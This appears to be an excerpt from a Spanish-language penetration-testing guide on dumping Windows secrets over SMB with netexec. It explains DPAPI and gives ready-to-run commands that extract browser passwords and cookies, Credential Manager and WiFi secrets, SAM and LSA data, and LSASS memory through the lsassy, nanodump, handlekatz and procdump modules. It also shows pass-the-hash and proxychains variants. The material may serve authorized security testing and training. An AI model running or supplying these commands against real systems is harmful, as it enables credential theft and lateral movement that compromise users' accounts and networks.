...
-
## DPAPI - Secretos cifrados del sistema
 
DPAPI (Data Protection API) es el mecanismo de Windows para cifrar secretos de usuario: credenciales almacenadas en navegadores (Chrome, Edge, Firefox), Windows Credential Manager, Outlook, WiFi, y otras aplicaciones. La clave maestra que los protege se deriva de la contraseña del usuario, por lo que con credenciales válidas es posible descifrarlos directamente.
...
Para volcar específicamente cookies de navegadores:
 
```bash
netexec smb <IP> -u <user> -p '<password>' --dpapi cookies
```
 
Los secretos descifrados se muestran en la salida e incluyen URLs, usuarios y contraseñas en claro de las aplicaciones que usan DPAPI para almacenarlas.
 
> Si el sistema objetivo tiene sesiones activas de navegador, esta opción puede revelar contraseñas de servicios web sin necesidad de crackear nada.
...
- `--dpapi` — Secretos DPAPI descifrados: navegadores, Credential Manager, Outlook, WiFi
...
Los flags `--sam`, `--lsa` y `--dpapi` pueden combinarse en una sola ejecución. Los módulos `-M` no se pueden combinar entre sí, pero sí se pueden combinar con cualquiera de esos flags en el mismo comando.
 
```bash
# SAM + LSA + DPAPI
netexec smb <IP> -u <user> -p '<password>' --sam --lsa --dpapi
 
# SAM + LSA + DPAPI + volcado de LSASS en una sola pasada
netexec smb <IP> -u <user> -p '<password>' --sam --lsa --dpapi -M lsassy
netexec smb <IP> -u <user> -p '<password>' --sam --lsa --dpapi -M nanodump
netexec smb <IP> -u <user> -p '<password>' --sam --lsa --dpapi -M handlekatz
netexec smb <IP> -u <user> -p '<password>' --sam --lsa --dpapi -M procdump
 
# Con autenticación por hash
netexec smb <IP> -u <user> -H <NTHASH> --local-auth --sam --lsa --dpapi -M lsassy
 
# Con Proxychains
proxychains4 -q netexec smb <IP> -u <user> -p '<password>' --sam --lsa --dpapi -M lsassy
```
 
Lo que no se puede es encadenar varios `-M` en el mismo comando. Si se quieren probar distintos módulos de LSASS hay que ejecutarlos en comandos separados.
 
`--ntds` es exclusivo del Domain Controller y tiene sentido ejecutarlo por separado dado que su alcance es distinto (dominio completo vs máquina local).